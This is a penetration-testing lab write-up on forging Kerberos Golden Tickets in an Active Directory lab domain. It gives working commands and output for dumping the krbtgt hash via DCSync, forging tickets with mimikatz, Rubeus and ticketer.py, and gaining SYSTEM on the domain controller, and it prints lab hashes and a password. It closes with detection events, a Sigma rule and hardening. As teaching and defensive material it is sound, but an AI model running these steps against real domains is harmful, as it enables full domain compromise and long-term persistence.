# 08 — Golden Ticket

> **Lab:** INLANEFREIGHT.LOCAL · DC: `172.16.5.5` (ACADEMY-EA-DC01) · Attack host: `172.16.5.225` (Kali Linux)  
> **MITRE ATT&CK:** [T1558.001 — Steal or Forge Kerberos Tickets: Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)  
> **Difficulty:** High · **Impact:** Full Domain Persistence → Domain-Wide Impersonation

---

## Table of Contents

1. [Overview](#1-overview)
2. [Root Cause Analysis](#2-root-cause-analysis)
3. [Prerequisites](#3-prerequisites)
4. [Lab Environment](#4-lab-environment)
5. [Attack Chain](#5-attack-chain)
6. [Phase 1 — Obtain krbtgt Hash](#6-phase-1--obtain-krbtgt-hash)
7. [Phase 2 — Obtain Domain SID](#7-phase-2--obtain-domain-sid)
8. [Phase 3 — Forge Golden Ticket (mimikatz — Windows)](#8-phase-3--forge-golden-ticket-mimikatz--windows)
9. [Phase 4 — Forge Golden Ticket (Rubeus — Windows)](#9-phase-4--forge-golden-ticket-rubeus--windows)
10. [Phase 5 — Forge Golden Ticket (ticketer.py — Linux)](#10-phase-5--forge-golden-ticket-ticketerpy--linux)
11. [Phase 6 — Use the Golden Ticket](#11-phase-6--use-the-golden-ticket)
12. [Persistence Characteristics](#12-persistence-characteristics)
13. [Validation](#13-validation)
14. [Detection](#14-detection)
15. [Hardening](#15-hardening)
16. [References](#16-references)

---

## 1. Overview

The Golden Ticket attack allows an attacker who has obtained the **krbtgt account's long-term key** to forge a **fully valid TGT** for any user in the domain — including non-existent users — with any group memberships they choose. The required key depends on the ticket encryption type: RC4-HMAC requires the KRBTGT NT hash; AES-128 and AES-256 require the corresponding KRBTGT AES key.

Because the TGT is encrypted with the krbtgt secret and the attacker possesses that secret, a forged TGT **may be accepted** by Domain Controllers in the same domain when its cryptographic validation, PAC contents, and applicable domain security checks pass.

**Important clarifications:**
- The Golden Ticket is valid within the **domain whose krbtgt key was used**. Cross-domain access depends on trust relationships — it is not automatic across every domain in a forest.
- The attacker still contacts the KDC to request TGS tickets for specific services. The forged TGT removes the need to know the account password, but TGS requests still flow through the KDC normally.
- A Golden Ticket is a powerful starting credential, not a guarantee of access to every service or resource in the domain.

---

## 2. Root Cause Analysis

```
Golden Ticket:
  Attacker has krbtgt long-term key (NT hash for RC4; AES key for AES)
  Attacker constructs TGT manually:
    - Set UserName to any value (including "administrator")
    - Set GroupIDs to 512 (Domain Admins), 519 (Enterprise Admins)
    - Set an attacker-selected validity period (example: 10 years)
    - Encrypt with the matching krbtgt key
  A DC may accept this as a legitimate TGT when cryptographic validation,
  PAC checks, and domain security configuration permit it

ROOT CAUSE: The KDC trusts what it can decrypt.
            PAC validation, domain configuration, and applicable security
            hardening affect acceptance of the forged ticket.
            Ticket validity ≠ resource authorization.
```

---

## 3. Prerequisites

| Requirement | Detail |
|---|---|
| **krbtgt long-term key** | RC4-HMAC: KRBTGT NT hash. AES-256: KRBTGT AES-256 key. Obtained via DCSync, NTDS.dit dump, or previous DC compromise. |
| **Domain SID** | Required to populate the PAC with correct group SIDs |
| **Domain name** | FQDN of the target domain |
| **Tools** | `mimikatz.exe`, `Rubeus.exe`, or `impacket-ticketer` |

---

## 4. Lab Environment

```
┌──────────────────────────────────────────────────────────────────┐
│  INLANEFREIGHT.LOCAL                                             │
│                                                                  │
│  ACADEMY-EA-DC01:   172.16.5.5    (Primary DC — KDC)             │
│                                                                  │
│  krbtgt NT hash:    16e26ba33e455a8c338142af8d89ffbc             │
│  Domain SID:        S-1-5-21-3842939050-3880317879-2865463114    │
│                                                                  │
│  Attack host: 172.16.5.225 (Kali) ens224                         │
└──────────────────────────────────────────────────────────────────┘
```

> The krbtgt hash above was obtained in Attack 09 (DCSync). In a real engagement, DCSync is performed first to obtain the krbtgt hash, then the golden ticket is forged for persistence.

---

## 5. Attack Chain

```
[1] DOMAIN COMPROMISE     [2] EXTRACT KRBTGT      [3] COLLECT DOMAIN INFO
──────────────────────    ──────────────────────  ──────────────────────
DA or DC access       →   DCSync or NTDS.dit   →  Domain SID
  (via PTH, PtT,          secretsdump.py           FQDN
   DCSync path)           mimikatz dcsync          

[4] FORGE TICKET          [5] INJECT / USE         [6] PERSIST
──────────────────────    ──────────────────────   ──────────────────────
mimikatz kerberos::golden → klist verify       →   Ticket valid 10 years
Rubeus /golden              psexec.py -k            Survives user password
ticketer.py                 Any service access      changes (not krbtgt)
```

---

## 6. Phase 1 — Obtain krbtgt Hash

### 6.1 DCSync to Extract krbtgt Hash (Linux)

```bash
Hackerpatel007_1@htb[/htb]$ secretsdump.py inlanefreight.local/administrator:'<password>'@172.16.5.5 \
  -just-dc-user INLANEFREIGHT/krbtgt
```

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d
krbtgt:aes128-cts-hmac-sha1-96:dee11cc3e37d8c7c92d9c90eae77ee64
krbtgt:des-cbc-md5:5e76b7f6b4e88c92
```

**krbtgt NT hash: `16e26ba33e455a8c338142af8d89ffbc`**

### 6.2 DCSync via mimikatz (Windows)

```cmd
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\krbtgt
```

---

## 7. Phase 2 — Obtain Domain SID

```powershell
PS C:\htb> Get-DomainSID
```

```
S-1-5-21-3842939050-3880317879-2865463114
```

```bash
Hackerpatel007_1@htb[/htb]$ lookupsid.py inlanefreight.local/wley:'transporter@4'@172.16.5.5 | grep "Domain SID"
```

```
[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
```

---

## 8. Phase 3 — Forge Golden Ticket (mimikatz — Windows)

```cmd
mimikatz # kerberos::golden /user:hacker /domain:inlanefreight.local \
  /sid:S-1-5-21-3842939050-3880317879-2865463114 \
  /krbtgt:16e26ba33e455a8c338142af8d89ffbc \
  /ptt
```

```
User      : hacker
Domain    : inlanefreight.local (INLANEFREIGHT)
SID       : S-1-5-21-3842939050-3880317879-2865463114
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 16e26ba33e455a8c338142af8d89ffbc - rc4_hmac_nt
Lifetime  : 11/9/2026 9:52:28 AM ; 11/6/2036 9:52:28 AM ; 11/6/2036 9:52:28 AM
-> Ticket : ** Pass The Ticket **

Golden ticket for 'hacker @ inlanefreight.local' successfully submitted for current session
```

**Groups included by default:** `513` (Domain Users), `512` (Domain Admins), `520` (Group Policy Creator Owners), `518` (Schema Admins), `519` (Enterprise Admins).

---

## 9. Phase 4 — Forge Golden Ticket (Rubeus — Windows)

```cmd
C:\htb> Rubeus.exe golden /rc4:16e26ba33e455a8c338142af8d89ffbc \
  /domain:inlanefreight.local \
  /sid:S-1-5-21-3842939050-3880317879-2865463114 \
  /user:hacker \
  /ptt
```

**Using AES256 encryption (requires AES-256 key — not the NT hash):**

```cmd
C:\htb> Rubeus.exe golden /aes256:69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d \
  /domain:inlanefreight.local \
  /sid:S-1-5-21-3842939050-3880317879-2865463114 \
  /user:hacker \
  /ptt
```

> **Key material — RC4 vs AES:** These are distinct secrets:
> - `/rc4:` accepts the krbtgt **NT hash** (`16e26ba33e455a8c338142af8d89ffbc`) — the value under `Hash NTLM:` in DCSync output.
> - `/aes256:` accepts the krbtgt **AES-256 key** (`69e57bd7e7421c3cfdab757af255d6af07d41b80913281e0c528d31e58e31e6d`) — the value labelled `aes256-cts-hmac-sha1-96:` in secretsdump/DCSync output.
> - These are not interchangeable. Supplying the NT hash to `/aes256:` produces an unusable ticket.

---

## 10. Phase 5 — Forge Golden Ticket (ticketer.py — Linux)

```bash
Hackerpatel007_1@htb[/htb]$ ticketer.py -nthash 16e26ba33e455a8c338142af8d89ffbc \
  -domain-sid S-1-5-21-3842939050-3880317879-2865463114 \
  -domain inlanefreight.local \
  hacker
```

```
[*] Saving ticket in hacker.ccache
```

```bash
Hackerpatel007_1@htb[/htb]$ export KRB5CCNAME=/home/kali/hacker.ccache
```

---

## 11. Phase 6 — Use the Golden Ticket

```cmd
C:\htb> klist
```

```
#0>     Client: hacker @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        End Time:   11/6/2036 9:52:28 (local)
```

```bash
Hackerpatel007_1@htb[/htb]$ psexec.py inlanefreight.local/hacker@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL \
  -k -no-pass
```

```
C:\Windows\system32> whoami
nt authority\system
```

---

## 12. Persistence Characteristics

```
┌────────────────────────────────────────────────────────────────────┐
│  GOLDEN TICKET PERSISTENCE PROPERTIES                              │
├────────────────────────────────────────────────────────────────────┤
│  Ticket lifetime:  Up to 10 years (attacker-defined)               │
│  User password:    Changing user password does NOT invalidate TGT  │
│  Disabling user:   Disabling account does NOT invalidate TGT       │
│  krbtgt rotation:  ONE rotation — golden tickets still valid       │
│  krbtgt rotation:  TWO rotations — golden tickets invalidated      │
│                                                                    │
│  Invalidation requires:                                            │
│    1. Reset krbtgt password                                        │
│    2. Wait for all DCs to replicate                                │
│    3. Reset krbtgt password again (removes old key material)       │
└────────────────────────────────────────────────────────────────────┘
```

---

## 13. Validation

```cmd
C:\htb> klist
# Confirm ticket loaded with 10-year expiry and correct domain

C:\htb> dir \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\C$
# Confirm admin access to DC
```

---

## 14. Detection

### Key Event IDs

| Event ID | Description | Golden Ticket Indicator |
|---|---|---|
| **4624** | Successful logon | Logon as non-existent user, or unexpected DA from odd IP |
| **4672** | Special privileges assigned | DA-level privileges on a logon that shouldn't have them |
| **4768** | TGT requested | Missing 4768 before 4769 — ticket was not issued by DC |

### Key Anomaly: Missing AS-REQ

> **Audit policy prerequisite:** This detection depends on both Event 4768 and Event 4769 being present. Event 4768 requires Success/Failure auditing on "Audit Kerberos Authentication Service". Event 4769 requires Success auditing on "Audit Kerberos Service Ticket Operations". Neither subcategory is configured by default.

A golden ticket is **forged** — it was never issued by the KDC. Therefore:
- There is **no Event 4768** (TGT request) corresponding to this logon
- The TGS-REQ (4769) appears without a preceding 4768

```
Legitimate logon: 4768 (TGT issued) → 4769 (TGS issued) → 4624 (logon)
Golden Ticket:                         4769 (TGS from forged TGT) → 4624
                                       ↑ No 4768 — ticket never requested from KDC
```

> **Detection caveat:** A missing 4768 before 4769 is a hunting signal, not proof of a Golden Ticket. Correlate with: source IP, account existence, unexpected group membership, unusual ticket lifetimes, encryption-type anomalies (RC4 where AES is expected).

### Sigma Rule

```yaml
# CORROBORATING INDICATOR — Not a direct Golden Ticket detector.
# Detects RC4 TGS requests in environments where AES is enforced.
# Also fires for any legacy client/service that does not support AES.
title: Kerberos Ticket Encryption Anomaly (RC4 When AES Expected)
id: a7a7f43e-0f7d-4113-b9d4-2d5f7c4e9c23
status: test
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: 0x17  # RC4-HMAC
  filter_expected:
    ServiceName|endswith:
      - '$'
  condition: selection and not filter_expected
falsepositives:
  - Legacy systems, printers, or services that do not support AES
level: medium
tags:
  - attack.credential_access
  - attack.t1558.001
```

---

## 15. Hardening

| Control | Detail |
|---|---|
| **Rotate krbtgt TWICE** | Single rotation leaves old key valid. Second rotation must occur **after at least one Kerberos ticket lifetime** (default max: 10 hours) has elapsed and all DCs have replicated the first rotation. |
| **Enforce AES256** | Prevents RC4-HMAC Kerberos operations including RC4-encrypted Golden Tickets. Does not prevent AES-based Golden Tickets — if attacker obtains the KRBTGT AES-256 key, they can still forge. |
| **Monitor 4768 absence** | Alert on 4769 without preceding 4768 for the same account |
| **Microsoft Defender for Identity** | Directly detects golden ticket attacks including forged PAC |
| **Tiered admin model** | Limit accounts with DCSync/DC access — if no one can run DCSync, the krbtgt hash cannot be extracted |

---

## 16. References

| Resource | Description |
|---|---|
| [MITRE T1558.001](https://attack.mitre.org/techniques/T1558/001/) | Steal or Forge Kerberos Tickets: Golden Ticket |
| [Mimikatz Golden Ticket](https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden) | kerberos::golden documentation |
| [Rubeus](https://github.com/GhostPack/Rubeus) | Rubeus /golden documentation |
| [impacket ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py) | Linux golden ticket forging |
| [Resetting the KRBTGT account password](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/ad-forest-recovery-resetting-the-krbtgt-password) | Microsoft guidance on krbtgt rotation |

---

*Source: HTB Academy — Active Directory Penetration Tester Path 2024*
